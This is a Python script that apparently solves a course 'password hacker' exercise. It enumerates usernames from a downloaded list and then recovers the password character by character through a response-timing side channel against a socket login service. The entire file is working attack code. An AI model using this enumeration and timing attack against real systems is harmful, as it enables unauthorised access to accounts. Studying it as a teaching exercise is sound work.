import json
import socket
import requests
from time import perf_counter
from sys import argv

ip, port = argv[1], int(argv[2])
client = socket.socket()
client.connect((ip, port))

alphabet = [chr(x) for x in range(256)]

url = 'https://stepik.org/media/attachments/lesson/255258/logins.txt'
login_list = requests.get(url)
login_list = login_list.text.splitlines()

for candidate in login_list:
    msg = {'login': candidate, 'password': ''}
    msg = json.dumps(msg)
    client.send(msg.encode())
    start = perf_counter()
    response = client.recv(1024).decode()
    default_response_time = perf_counter() - start
    response = json.loads(response)['result']
    if response == "Wrong password!":
        login = candidate
        break

candidate = ''
password = ''
delay_norm = 1

while not password:
    for i in alphabet:
        msg = {'login': login, 'password': f'{candidate}{i}'}
        msg = json.dumps(msg)
        client.send(msg.encode())
        start = perf_counter()
        response = client.recv(1024).decode()
        delay = perf_counter() - start - default_response_time
        response = json.loads(response)['result']
        if delay > delay_norm:
            candidate = f'{candidate}{i}'
            break
        elif response == "Connection success!":
            password = f'{candidate}{i}'
            break
    else:
        delay_norm /= 10
        if delay_norm < 0.0000000000000000001:
            print('error')
            break
result = json.dumps({'login': login, 'password': password})
print(result)
